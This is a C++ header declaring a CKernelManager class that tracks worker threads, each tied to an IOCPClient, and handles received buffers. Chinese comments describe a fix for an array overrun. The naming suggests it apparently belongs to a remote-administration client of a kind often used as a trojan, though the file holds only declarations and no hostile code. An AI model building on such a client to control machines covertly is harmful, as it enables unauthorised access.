// KernelManager.h: interface for the CKernelManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
#define AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include <vector>

#define MAX_THREADNUM 0x1000

// 线程信息结构体, 包含3个成员: 运行状态(run)、句柄(h)和通讯客户端(p).
struct ThreadInfo
{
	BOOL run;
	HANDLE h;
	IOCPClient *p;
	ThreadInfo() : run(TRUE), h(NULL), p(NULL){ }
};

class CKernelManager : public CManager  
{
public:
	CKernelManager(IOCPClient* ClientObject);
	virtual ~CKernelManager();
	VOID OnReceive(PBYTE szBuffer, ULONG ulLength);

	ThreadInfo  m_hThread[MAX_THREADNUM];
	// 此值在原代码中是用于记录线程数量；当线程数量超出限制时m_hThread会越界而导致程序异常
	// 因此我将此值的含义修改为"可用线程下标"，代表数组m_hThread中所指位置可用，即创建新的线程放置在该位置
	ULONG   m_ulThreadCount;
	UINT	GetAvailableIndex();
};

#endif // !defined(AFX_KERNELMANAGER_H__B1186DC0_E4D7_4D1A_A8B8_08A01B87B89E__INCLUDED_)
